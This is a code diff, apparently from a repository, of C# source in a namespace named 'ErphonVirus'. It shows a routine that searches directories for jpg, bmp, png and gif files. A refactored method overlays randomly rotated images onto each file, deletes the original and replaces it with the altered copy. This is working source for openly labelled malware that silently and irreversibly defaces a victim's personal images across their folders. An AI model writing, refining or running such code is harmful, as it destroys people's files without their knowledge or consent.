@@ -44,7 +44,6 @@ namespace ErphonVirus
                             searchDirectories.Push(childDirectoryInfo);
                         foreach (string childFileInfo in Directory.EnumerateFiles(currentDirectoryInfo))
                         {
-
                             if (childFileInfo.EndsWith("jpg") || childFileInfo.EndsWith("bmp") ||
                                 childFileInfo.EndsWith("png") || childFileInfo.EndsWith("gif"))
                             {
@@ -70,29 +69,31 @@ namespace ErphonVirus
 
         public static void Erphonize(string childFileInfo, Image[] erphonImages, Random rnd)
         {
-            Image image = Image.FromFile(childFileInfo);
-            Graphics g = Graphics.FromImage(image);
-            int rndAmount = rnd.Next(MAX_IMG_COUNT - MIN_IMG_COUNT) + MIN_IMG_COUNT;
-            for (int i = 0; i < rndAmount; i++)
+            using (Image image = Image.FromFile(childFileInfo))
             {
-                Image rndImage = erphonImages[rnd.Next(erphonImages.Length)];
-                int w = rnd.Next(image.Width) / 3;
-                int h = rnd.Next(image.Height) / 3;
-                int x = rnd.Next(image.Width - w);
-                int y = rnd.Next(image.Height - h);
-                int ang = rnd.Next(360);
-                g.TranslateTransform(x, y);
-                g.RotateTransform(ang);
-                g.TranslateTransform(-x, -y);
-                g.DrawImage(rndImage,
-                    new Rectangle(x, y, w, h));
-                g.TranslateTransform(x, y);
-                g.RotateTransform(-ang);
-                g.TranslateTransform(-x, -y);
+                using (Graphics g = Graphics.FromImage(image))
+                {
+                    int rndAmount = rnd.Next(MAX_IMG_COUNT - MIN_IMG_COUNT) + MIN_IMG_COUNT;
+                    for (int i = 0; i < rndAmount; i++)
+                    {
+                        Image rndImage = erphonImages[rnd.Next(erphonImages.Length)];
+                        int w = rnd.Next(image.Width)/3;
+                        int h = rnd.Next(image.Height)/3;
+                        int x = rnd.Next(image.Width - w);
+                        int y = rnd.Next(image.Height - h);
+                        int ang = rnd.Next(360);
+                        g.TranslateTransform(x, y);
+                        g.RotateTransform(ang);
+                        g.TranslateTransform(-x, -y);
+                        g.DrawImage(rndImage,
+                            new Rectangle(x, y, w, h));
+                        g.TranslateTransform(x, y);
+                        g.RotateTransform(-ang);
+                        g.TranslateTransform(-x, -y);
+                    }
+                    image.Save(childFileInfo + ".bak");
+                }
             }
-            image.Save(childFileInfo + ".bak");
-            image.Dispose();
-            g.Dispose();
             File.Delete(childFileInfo);
             File.Move(childFileInfo + ".bak", childFileInfo);
         }
